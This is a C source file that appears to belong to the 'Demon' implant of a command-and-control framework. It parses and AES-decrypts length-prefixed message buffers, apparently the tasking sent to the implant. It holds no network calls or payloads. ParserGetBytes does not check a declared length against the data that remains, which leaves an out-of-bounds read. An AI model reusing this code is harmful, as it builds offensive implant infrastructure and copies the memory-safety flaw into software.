#include <Demon.h>

#include <Core/Parser.h>
#include <Core/MiniStd.h>
#include <Crypt/AesCrypt.h>

VOID ParserNew( PPARSER parser, PCHAR Buffer, UINT32 size )
{
    if ( parser == NULL )
        return;

    parser->Original = Instance.Win32.LocalAlloc( LPTR, size );
    
    MemCopy( parser->Original, Buffer, size );

    parser->Buffer   = parser->Original;
    parser->Length   = size;
    parser->Size     = size;
}

VOID ParserDecrypt( PPARSER parser, PBYTE Key, PBYTE IV )
{
    AESCTX AesCtx = { 0 };

    if ( parser == NULL )
        return;

    AesInit( &AesCtx, Key, IV );
    AesXCryptBuffer( &AesCtx, parser->Buffer, parser->Length );
}

INT ParserGetInt32( PPARSER parser )
{
    INT32 intBytes = 0;

    if ( ! parser )
        return 0;

    if ( parser->Length < 4 )
        return 0;

    MemCopy( &intBytes, parser->Buffer, 4 );

    parser->Buffer += 4;
    parser->Length -= 4;

    if ( ! parser->Endian )
        return ( INT ) intBytes;
    else
        return ( INT ) __builtin_bswap32( intBytes );
}

PCHAR ParserGetBytes( PPARSER parser, PINT size )
{
    UINT32  Length  = 0;
    PCHAR   outdata = NULL;

    if ( ! parser )
        return NULL;

    if ( parser->Length < 4 )
        return NULL;

    MemCopy( &Length, parser->Buffer, 4 );
    parser->Buffer += 4;

    if ( parser->Endian )
        Length = __builtin_bswap32( Length );

    outdata = parser->Buffer;
    if ( outdata == NULL )
        return NULL;

    parser->Length -= 4;
    parser->Length -= Length;
    parser->Buffer += Length;

    if ( size != NULL )
        *size = Length;

    return outdata;
}

VOID ParserDestroy( PPARSER Parser )
{
    if ( Parser->Original )
    {
        MemSet( Parser->Original, 0, Parser->Size );
        Instance.Win32.LocalFree( Parser->Original );
        Parser->Original = NULL;
    }
}
